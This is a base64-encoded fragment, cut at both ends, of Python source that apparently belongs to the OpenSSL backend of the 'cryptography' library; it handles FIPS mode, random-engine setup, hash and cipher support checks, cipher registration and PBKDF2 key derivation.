yNTZSMSxcclxuICAgICAgICBlYy5TRUNQMzg0UjEsXHJcbiAgICAgICAgZWMuU0VDUDUyMVIxLFxyXG4gICAgKVxyXG4gICAgX2ZpcHNfcnNhX21pbl9rZXlfc2l6ZSA9IDIwNDhcclxuICAgIF9maXBzX3JzYV9taW5fcHVibGljX2V4cG9uZW50ID0gNjU1MzdcclxuICAgIF9maXBzX2RzYV9taW5fbW9kdWx1cyA9IDEgPDwgMjA0OFxyXG4gICAgX2ZpcHNfZGhfbWluX2tleV9zaXplID0gMjA0OFxyXG4gICAgX2ZpcHNfZGhfbWluX21vZHVsdXMgPSAxIDw8IF9maXBzX2RoX21pbl9rZXlfc2l6ZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmKTpcclxuICAgICAgICBzZWxmLl9iaW5kaW5nID0gYmluZGluZy5CaW5kaW5nKClcclxuICAgICAgICBzZWxmLl9mZmkgPSBzZWxmLl9iaW5kaW5nLmZmaVxyXG4gICAgICAgIHNlbGYuX2xpYiA9IHNlbGYuX2JpbmRpbmcubGliXHJcbiAgICAgICAgc2VsZi5fcnNhX3NraXBfY2hlY2tfa2V5ID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9maXBzX2VuYWJsZWQgPSBzZWxmLl9pc19maXBzX2VuYWJsZWQoKVxyXG5cclxuICAgICAgICBzZWxmLl9jaXBoZXJfcmVnaXN0cnkgPSB7fVxyXG4gICAgICAgIHNlbGYuX3JlZ2lzdGVyX2RlZmF1bHRfY2lwaGVycygpXHJcbiAgICAgICAgaWYgc2VsZi5fZmlwc19lbmFibGVkIGFuZCBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX05FRURTX09TUkFORE9NX0VOR0lORTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJPcGVuU1NMIEZJUFMgbW9kZSBpcyBlbmFibGVkLiBDYW5cJ3QgZW5hYmxlIERSQkcgZm9yayBzYWZldHkuIixcclxuICAgICAgICAgICAgICAgIFVzZXJXYXJuaW5nLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5hY3RpdmF0ZV9vc3JhbmRvbV9lbmdpbmUoKVxyXG4gICAgICAgIHNlbGYuX2RoX3R5cGVzID0gW3NlbGYuX2xpYi5FVlBfUEtFWV9ESF1cclxuICAgICAgICBpZiBzZWxmLl9saWIuQ3J5cHRvZ3JhcGh5X0hBU19FVlBfUEtFWV9ESFg6XHJcbiAgICAgICAgICAgIHNlbGYuX2RoX3R5cGVzLmFwcGVuZChzZWxmLl9saWIuRVZQX1BLRVlfREhYKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8T3BlblNTTEJhY2tlbmQodmVyc2lvbjoge30sIEZJUFM6IHt9KT4iLmZvcm1hdChcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX3ZlcnNpb25fdGV4dCgpLCBzZWxmLl9maXBzX2VuYWJsZWRcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIG9wZW5zc2xfYXNzZXJ0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgb2s6IGJvb2wsXHJcbiAgICAgICAgZXJyb3JzOiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbYmluZGluZy5fT3BlblNTTEVycm9yXV0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBiaW5kaW5nLl9vcGVuc3NsX2Fzc2VydChzZWxmLl9saWIsIG9rLCBlcnJvcnM9ZXJyb3JzKVxyXG5cclxuICAgIGRlZiBfaXNfZmlwc19lbmFibGVkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgc2VsZi5fbGliLkNyeXB0b2dyYXBoeV9IQVNfMzAwX0ZJUFM6XHJcbiAgICAgICAgICAgIG1vZGUgPSBzZWxmLl9saWIuRVZQX2RlZmF1bHRfcHJvcGVydGllc19pc19maXBzX2VuYWJsZWQoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9mZmkuTlVMTFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbW9kZSA9IGdldGF0dHIoc2VsZi5fbGliLCAiRklQU19tb2RlIiwgbGFtYmRhOiAwKSgpXHJcblxyXG4gICAgICAgIGlmIG1vZGUgPT0gMDpcclxuICAgICAgICAgICAgIyBPcGVuU1NMIHdpdGhvdXQgRklQUyBwdXNoZXMgYW4gZXJyb3Igb24gdGhlIGVycm9yIHN0YWNrXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5FUlJfY2xlYXJfZXJyb3IoKVxyXG4gICAgICAgIHJldHVybiBib29sKG1vZGUpXHJcblxyXG4gICAgZGVmIF9lbmFibGVfZmlwcyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgICMgVGhpcyBmdW5jdGlvbiBlbmFibGVzIEZJUFMgbW9kZSBmb3IgT3BlblNTTCAzLjAuMCBvbiBpbnN0YWxscyB0aGF0XHJcbiAgICAgICAgIyBoYXZlIHRoZSBGSVBTIHByb3ZpZGVyIGluc3RhbGxlZCBwcm9wZXJseS5cclxuICAgICAgICBzZWxmLl9iaW5kaW5nLl9lbmFibGVfZmlwcygpXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX2lzX2ZpcHNfZW5hYmxlZCgpXHJcbiAgICAgICAgc2VsZi5fZmlwc19lbmFibGVkID0gc2VsZi5faXNfZmlwc19lbmFibGVkKClcclxuXHJcbiAgICBkZWYgYWN0aXZhdGVfYnVpbHRpbl9yYW5kb20oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX05FRURTX09TUkFORE9NX0VOR0lORTpcclxuICAgICAgICAgICAgIyBPYnRhaW4gYSBuZXcgc3RydWN0dXJhbCByZWZlcmVuY2UuXHJcbiAgICAgICAgICAgIGUgPSBzZWxmLl9saWIuRU5HSU5FX2dldF9kZWZhdWx0X1JBTkQoKVxyXG4gICAgICAgICAgICBpZiBlICE9IHNlbGYuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGliLkVOR0lORV91bnJlZ2lzdGVyX1JBTkQoZSlcclxuICAgICAgICAgICAgICAgICMgUmVzZXQgdGhlIFJORyB0byB1c2UgdGhlIGJ1aWx0LWluLlxyXG4gICAgICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLlJBTkRfc2V0X3JhbmRfbWV0aG9kKHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICAgICAgICAgICMgZGVjcmVtZW50IHRoZSBzdHJ1Y3R1cmFsIHJlZmVyZW5jZSBmcm9tIGdldF9kZWZhdWx0X1JBTkRcclxuICAgICAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FTkdJTkVfZmluaXNoKGUpXHJcbiAgICAgICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgIEBjb250ZXh0bGliLmNvbnRleHRtYW5hZ2VyXHJcbiAgICBkZWYgX2dldF9vc3VyYW5kb21fZW5naW5lKHNlbGYpOlxyXG4gICAgICAgICMgRmV0Y2hlcyBhbiBlbmdpbmUgYnkgaWQgYW5kIHJldHVybnMgaXQuIFRoaXMgY3JlYXRlcyBhIHN0cnVjdHVyYWxcclxuICAgICAgICAjIHJlZmVyZW5jZS5cclxuICAgICAgICBlID0gc2VsZi5fbGliLkVOR0lORV9ieV9pZChzZWxmLl9saWIuQ3J5cHRvZ3JhcGh5X29zcmFuZG9tX2VuZ2luZV9pZClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGUgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgIyBJbml0aWFsaXplIHRoZSBlbmdpbmUgZm9yIHVzZS4gVGhpcyBhZGRzIGEgZnVuY3Rpb25hbCByZWZlcmVuY2UuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkVOR0lORV9pbml0KGUpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICB5aWVsZCBlXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgIyBEZWNyZW1lbnQgdGhlIHN0cnVjdHVyYWwgcmVmIGluY3JlbWVudGVkIGJ5IEVOR0lORV9ieV9pZC5cclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLkVOR0lORV9mcmVlKGUpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgICAgICMgRGVjcmVtZW50IHRoZSBmdW5jdGlvbmFsIHJlZiBpbmNyZW1lbnRlZCBieSBFTkdJTkVfaW5pdC5cclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLkVOR0lORV9maW5pc2goZSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICBkZWYgYWN0aXZhdGVfb3NyYW5kb21fZW5naW5lKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fbGliLkNSWVBUT0dSQVBIWV9ORUVEU19PU1JBTkRPTV9FTkdJTkU6XHJcbiAgICAgICAgICAgICMgVW5yZWdpc3RlciBhbmQgZnJlZSB0aGUgY3VycmVudCBlbmdpbmUuXHJcbiAgICAgICAgICAgIHNlbGYuYWN0aXZhdGVfYnVpbHRpbl9yYW5kb20oKVxyXG4gICAgICAgICAgICB3aXRoIHNlbGYuX2dldF9vc3VyYW5kb21fZW5naW5lKCkgYXMgZTpcclxuICAgICAgICAgICAgICAgICMgU2V0IHRoZSBlbmdpbmUgYXMgdGhlIGRlZmF1bHQgUkFORCBwcm92aWRlci5cclxuICAgICAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FTkdJTkVfc2V0X2RlZmF1bHRfUkFORChlKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICAgICAgIyBSZXNldCB0aGUgUk5HIHRvIHVzZSB0aGUgZW5naW5lXHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5SQU5EX3NldF9yYW5kX21ldGhvZChzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICBkZWYgb3NyYW5kb21fZW5naW5lX2ltcGxlbWVudGF0aW9uKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBidWYgPSBzZWxmLl9mZmkubmV3KCJjaGFyW10iLCA2NClcclxuICAgICAgICB3aXRoIHNlbGYuX2dldF9vc3VyYW5kb21fZW5naW5lKCkgYXMgZTpcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLkVOR0lORV9jdHJsX2NtZChcclxuICAgICAgICAgICAgICAgIGUsIGIiZ2V0X2ltcGxlbWVudGF0aW9uIiwgbGVuKGJ1ZiksIGJ1Ziwgc2VsZi5fZmZpLk5VTEwsIDBcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA+IDApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZmaS5zdHJpbmcoYnVmKS5kZWNvZGUoImFzY2lpIilcclxuXHJcbiAgICBkZWYgb3BlbnNzbF92ZXJzaW9uX3RleHQoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEZyaWVuZGx5IHN0cmluZyBuYW1lIG9mIHRoZSBsb2FkZWQgT3BlblNTTCBsaWJyYXJ5LiBUaGlzIGlzIG5vdFxyXG4gICAgICAgIG5lY2Vzc2FyaWx5IHRoZSBzYW1lIHZlcnNpb24gYXMgaXQgd2FzIGNvbXBpbGVkIGFnYWluc3QuXHJcblxyXG4gICAgICAgIEV4YW1wbGU6IE9wZW5TU0wgMS4xLjFkICAxMCBTZXAgMjAxOVxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9mZmkuc3RyaW5nKFxyXG4gICAgICAgICAgICBzZWxmLl9saWIuT3BlblNTTF92ZXJzaW9uKHNlbGYuX2xpYi5PUEVOU1NMX1ZFUlNJT04pXHJcbiAgICAgICAgKS5kZWNvZGUoImFzY2lpIilcclxuXHJcbiAgICBkZWYgb3BlbnNzbF92ZXJzaW9uX251bWJlcihzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xpYi5PcGVuU1NMX3ZlcnNpb25fbnVtKClcclxuXHJcbiAgICBkZWYgY3JlYXRlX2htYWNfY3R4KFxyXG4gICAgICAgIHNlbGYsIGtleTogYnl0ZXMsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG1cclxuICAgICkgLT4gX0hNQUNDb250ZXh0OlxyXG4gICAgICAgIHJldHVybiBfSE1BQ0NvbnRleHQoc2VsZiwga2V5LCBhbGdvcml0aG0pXHJcblxyXG4gICAgZGVmIF9ldnBfbWRfZnJvbV9hbGdvcml0aG0oc2VsZiwgYWxnb3JpdGhtOiBoYXNoZXMuSGFzaEFsZ29yaXRobSk6XHJcbiAgICAgICAgaWYgYWxnb3JpdGhtLm5hbWUgPT0gImJsYWtlMmIiIG9yIGFsZ29yaXRobS5uYW1lID09ICJibGFrZTJzIjpcclxuICAgICAgICAgICAgYWxnID0gInt9e30iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgIGFsZ29yaXRobS5uYW1lLCBhbGdvcml0aG0uZGlnZXN0X3NpemUgKiA4XHJcbiAgICAgICAgICAgICkuZW5jb2RlKCJhc2NpaSIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYWxnID0gYWxnb3JpdGhtLm5hbWUuZW5jb2RlKCJhc2NpaSIpXHJcblxyXG4gICAgICAgIGV2cF9tZCA9IHNlbGYuX2xpYi5FVlBfZ2V0X2RpZ2VzdGJ5bmFtZShhbGcpXHJcbiAgICAgICAgcmV0dXJuIGV2cF9tZFxyXG5cclxuICAgIGRlZiBfZXZwX21kX25vbl9udWxsX2Zyb21fYWxnb3JpdGhtKHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pOlxyXG4gICAgICAgIGV2cF9tZCA9IHNlbGYuX2V2cF9tZF9mcm9tX2FsZ29yaXRobShhbGdvcml0aG0pXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChldnBfbWQgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGV2cF9tZFxyXG5cclxuICAgIGRlZiBoYXNoX3N1cHBvcnRlZChzZWxmLCBhbGdvcml0aG06IGhhc2hlcy5IYXNoQWxnb3JpdGhtKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZCBhbmQgbm90IGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBzZWxmLl9maXBzX2hhc2hlcyk6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgICAgICBldnBfbWQgPSBzZWxmLl9ldnBfbWRfZnJvbV9hbGdvcml0aG0oYWxnb3JpdGhtKVxyXG4gICAgICAgIHJldHVybiBldnBfbWQgIT0gc2VsZi5fZmZpLk5VTExcclxuXHJcbiAgICBkZWYgc2lnbmF0dXJlX2hhc2hfc3VwcG9ydGVkKFxyXG4gICAgICAgIHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG1cclxuICAgICkgLT4gYm9vbDpcclxuICAgICAgICAjIERlZGljYXRlZCBjaGVjayBmb3IgaGFzaGluZyBhbGdvcml0aG0gdXNlIGluIG1lc3NhZ2UgZGlnZXN0IGZvclxyXG4gICAgICAgICMgc2lnbmF0dXJlcywgZS5nLiBSU0EgUEtDUyMxIHYxLjUgU0hBMSAoc2hhMVdpdGhSU0FFbmNyeXB0aW9uKS5cclxuICAgICAgICBpZiBzZWxmLl9maXBzX2VuYWJsZWQgYW5kIGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBoYXNoZXMuU0hBMSk6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgIHJldHVybiBzZWxmLmhhc2hfc3VwcG9ydGVkKGFsZ29yaXRobSlcclxuXHJcbiAgICBkZWYgc2NyeXB0X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfSEFTX1NDUllQVCA9PSAxXHJcblxyXG4gICAgZGVmIGhtYWNfc3VwcG9ydGVkKHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pIC0+IGJvb2w6XHJcbiAgICAgICAgIyBGSVBTIG1vZGUgc3RpbGwgYWxsb3dzIFNIQTEgZm9yIEhNQUNcclxuICAgICAgICBpZiBzZWxmLl9maXBzX2VuYWJsZWQgYW5kIGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBoYXNoZXMuU0hBMSk6XHJcbiAgICAgICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLmhhc2hfc3VwcG9ydGVkKGFsZ29yaXRobSlcclxuXHJcbiAgICBkZWYgY3JlYXRlX2hhc2hfY3R4KFxyXG4gICAgICAgIHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG1cclxuICAgICkgLT4gaGFzaGVzLkhhc2hDb250ZXh0OlxyXG4gICAgICAgIHJldHVybiBfSGFzaENvbnRleHQoc2VsZiwgYWxnb3JpdGhtKVxyXG5cclxuICAgIGRlZiBjaXBoZXJfc3VwcG9ydGVkKHNlbGYsIGNpcGhlcjogQ2lwaGVyQWxnb3JpdGhtLCBtb2RlOiBNb2RlKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgIyBGSVBTIG1vZGUgcmVxdWlyZXMgQUVTLiBUcmlwbGVERVMgaXMgZGlzYWxsb3dlZC9kZXByZWNhdGVkIGluXHJcbiAgICAgICAgICAgICMgRklQUyAxNDAtMy5cclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY2lwaGVyLCBzZWxmLl9maXBzX2NpcGhlcnMpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYWRhcHRlciA9IHNlbGYuX2NpcGhlcl9yZWdpc3RyeVt0eXBlKGNpcGhlciksIHR5cGUobW9kZSldXHJcbiAgICAgICAgZXhjZXB0IEtleUVycm9yOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuICAgICAgICBldnBfY2lwaGVyID0gYWRhcHRlcihzZWxmLCBjaXBoZXIsIG1vZGUpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZmaS5OVUxMICE9IGV2cF9jaXBoZXJcclxuXHJcbiAgICBkZWYgcmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoc2VsZiwgY2lwaGVyX2NscywgbW9kZV9jbHMsIGFkYXB0ZXIpOlxyXG4gICAgICAgIGlmIChjaXBoZXJfY2xzLCBtb2RlX2NscykgaW4gc2VsZi5fY2lwaGVyX3JlZ2lzdHJ5OlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkR1cGxpY2F0ZSByZWdpc3RyYXRpb24gZm9yOiB7fSB7fS4iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICBjaXBoZXJfY2xzLCBtb2RlX2Nsc1xyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fY2lwaGVyX3JlZ2lzdHJ5W2NpcGhlcl9jbHMsIG1vZGVfY2xzXSA9IGFkYXB0ZXJcclxuXHJcbiAgICBkZWYgX3JlZ2lzdGVyX2RlZmF1bHRfY2lwaGVycyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGZvciBtb2RlX2NscyBpbiBbQ0JDLCBDVFIsIEVDQiwgT0ZCLCBDRkIsIENGQjgsIEdDTV06XHJcbiAgICAgICAgICAgIHNlbGYucmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoXHJcbiAgICAgICAgICAgICAgICBBRVMsXHJcbiAgICAgICAgICAgICAgICBtb2RlX2NscyxcclxuICAgICAgICAgICAgICAgIEdldENpcGhlckJ5TmFtZSgie2NpcGhlci5uYW1lfS17Y2lwaGVyLmtleV9zaXplfS17bW9kZS5uYW1lfSIpLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZm9yIG1vZGVfY2xzIGluIFtDQkMsIENUUiwgRUNCLCBPRkIsIENGQl06XHJcbiAgICAgICAgICAgIHNlbGYucmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoXHJcbiAgICAgICAgICAgICAgICBDYW1lbGxpYSxcclxuICAgICAgICAgICAgICAgIG1vZGVfY2xzLFxyXG4gICAgICAgICAgICAgICAgR2V0Q2lwaGVyQnlOYW1lKCJ7Y2lwaGVyLm5hbWV9LXtjaXBoZXIua2V5X3NpemV9LXttb2RlLm5hbWV9IiksXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBmb3IgbW9kZV9jbHMgaW4gW0NCQywgQ0ZCLCBDRkI4LCBPRkJdOlxyXG4gICAgICAgICAgICBzZWxmLnJlZ2lzdGVyX2NpcGhlcl9hZGFwdGVyKFxyXG4gICAgICAgICAgICAgICAgVHJpcGxlREVTLCBtb2RlX2NscywgR2V0Q2lwaGVyQnlOYW1lKCJkZXMtZWRlMy17bW9kZS5uYW1lfSIpXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLnJlZ2lzdGVyX2NpcGhlcl9hZGFwdGVyKFxyXG4gICAgICAgICAgICBUcmlwbGVERVMsIEVDQiwgR2V0Q2lwaGVyQnlOYW1lKCJkZXMtZWRlMyIpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGZvciBtb2RlX2NscyBpbiBbQ0JDLCBDRkIsIE9GQiwgRUNCXTpcclxuICAgICAgICAgICAgc2VsZi5yZWdpc3Rlcl9jaXBoZXJfYWRhcHRlcihcclxuICAgICAgICAgICAgICAgIF9CbG93ZmlzaEludGVybmFsLCBtb2RlX2NscywgR2V0Q2lwaGVyQnlOYW1lKCJiZi17bW9kZS5uYW1lfSIpXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBmb3IgbW9kZV9jbHMgaW4gW0NCQywgQ0ZCLCBPRkIsIEVDQl06XHJcbiAgICAgICAgICAgIHNlbGYucmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoXHJcbiAgICAgICAgICAgICAgICBfU0VFREludGVybmFsLCBtb2RlX2NscywgR2V0Q2lwaGVyQnlOYW1lKCJzZWVkLXttb2RlLm5hbWV9IilcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGZvciBjaXBoZXJfY2xzLCBtb2RlX2NscyBpbiBpdGVydG9vbHMucHJvZHVjdChcclxuICAgICAgICAgICAgW19DQVNUNUludGVybmFsLCBfSURFQUludGVybmFsXSxcclxuICAgICAgICAgICAgW0NCQywgT0ZCLCBDRkIsIEVDQl0sXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgc2VsZi5yZWdpc3Rlcl9jaXBoZXJfYWRhcHRlcihcclxuICAgICAgICAgICAgICAgIGNpcGhlcl9jbHMsXHJcbiAgICAgICAgICAgICAgICBtb2RlX2NscyxcclxuICAgICAgICAgICAgICAgIEdldENpcGhlckJ5TmFtZSgie2NpcGhlci5uYW1lfS17bW9kZS5uYW1lfSIpLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgc2VsZi5yZWdpc3Rlcl9jaXBoZXJfYWRhcHRlcihBUkM0LCB0eXBlKE5vbmUpLCBHZXRDaXBoZXJCeU5hbWUoInJjNCIpKVxyXG4gICAgICAgICMgV2UgZG9uXCd0IGFjdHVhbGx5IHN1cHBvcnQgUkMyLCB0aGlzIGlzIGp1c3QgdXNlZCBieSBzb21lIHRlc3RzLlxyXG4gICAgICAgIHNlbGYucmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoX1JDMiwgdHlwZShOb25lKSwgR2V0Q2lwaGVyQnlOYW1lKCJyYzIiKSlcclxuICAgICAgICBzZWxmLnJlZ2lzdGVyX2NpcGhlcl9hZGFwdGVyKFxyXG4gICAgICAgICAgICBDaGFDaGEyMCwgdHlwZShOb25lKSwgR2V0Q2lwaGVyQnlOYW1lKCJjaGFjaGEyMCIpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYucmVnaXN0ZXJfY2lwaGVyX2FkYXB0ZXIoQUVTLCBYVFMsIF9nZXRfeHRzX2NpcGhlcilcclxuICAgICAgICBmb3IgbW9kZV9jbHMgaW4gW0VDQiwgQ0JDLCBPRkIsIENGQiwgQ1RSXTpcclxuICAgICAgICAgICAgc2VsZi5yZWdpc3Rlcl9jaXBoZXJfYWRhcHRlcihcclxuICAgICAgICAgICAgICAgIFNNNCwgbW9kZV9jbHMsIEdldENpcGhlckJ5TmFtZSgic200LXttb2RlLm5hbWV9IilcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBjcmVhdGVfc3ltbWV0cmljX2VuY3J5cHRpb25fY3R4KFxyXG4gICAgICAgIHNlbGYsIGNpcGhlcjogQ2lwaGVyQWxnb3JpdGhtLCBtb2RlOiBNb2RlXHJcbiAgICApIC0+IF9DaXBoZXJDb250ZXh0OlxyXG4gICAgICAgIHJldHVybiBfQ2lwaGVyQ29udGV4dChzZWxmLCBjaXBoZXIsIG1vZGUsIF9DaXBoZXJDb250ZXh0Ll9FTkNSWVBUKVxyXG5cclxuICAgIGRlZiBjcmVhdGVfc3ltbWV0cmljX2RlY3J5cHRpb25fY3R4KFxyXG4gICAgICAgIHNlbGYsIGNpcGhlcjogQ2lwaGVyQWxnb3JpdGhtLCBtb2RlOiBNb2RlXHJcbiAgICApIC0+IF9DaXBoZXJDb250ZXh0OlxyXG4gICAgICAgIHJldHVybiBfQ2lwaGVyQ29udGV4dChzZWxmLCBjaXBoZXIsIG1vZGUsIF9DaXBoZXJDb250ZXh0Ll9ERUNSWVBUKVxyXG5cclxuICAgIGRlZiBwYmtkZjJfaG1hY19zdXBwb3J0ZWQoc2VsZiwgYWxnb3JpdGhtOiBoYXNoZXMuSGFzaEFsZ29yaXRobSkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5obWFjX3N1cHBvcnRlZChhbGdvcml0aG0pXHJcblxyXG4gICAgZGVmIGRlcml2ZV9wYmtkZjJfaG1hYyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0sXHJcbiAgICAgICAgbGVuZ3RoOiBpbnQsXHJcbiAgICAgICAgc2FsdDogYnl0ZXMsXHJcbiAgICAgICAgaXRlcmF0aW9uczogaW50LFxyXG4gICAgICAgIGtleV9tYXRlcmlhbDogYnl0ZXMsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIGxlbmd0aClcclxuICAgICAgICBldnBfbWQgPSBzZWxmLl9ldnBfbWRfbm9uX251bGxfZnJvbV9hbGdvcml0aG0oYWxnb3JpdGhtKVxyXG4gICAgICAgIGtleV9tYXRlcmlhbF9wdHIgPSBzZWxmLl9mZmkuZnJvbV9idWZmZXIoa2V5X21hdGVyaWFsKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5QS0NTNV9QQktERjJfSE1BQyhcclxuICAgICAgICAgICAga2V5X21hdGVyaWFsX3B0cixcclxuICAgICAgICAgICAgbGVuKGtleV9tYXRlcmlhbCksXHJcbiAgICAgICAgICAgIHNhbHQsXHJcbiAgICAgICAgICAgIGxlbihzYWx0KSxcclxuICAgICAgICAgICAgaXRlcmF0aW9ucyxcclxuICAgICAgICAgICAgZXZwX21kLFxyXG4gICAgICAgICAgICBsZW5ndGgsXHJcbiAgICAgICAgICAgIGJ1ZixcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fZmZpLmJ1ZmZlcihidWYpWzpdXHJcblxyXG4gICAgZGVmIF9jb25zdW1lX2Vycm9ycyhzZWxmKSAtPiB0eXBpbmcuTGlzdFtiaW5kaW5nLl9PcGVuU1NMRXJyb3JdOlxyXG4gICAgICAgIHJldHVybiBiaW5kaW5nLl9jb25zdW1lX2Vycm9ycyhzZWxmLl9saWIpXHJcblxyXG4gICAgZGVmIF9jb25zdW1lX2Vy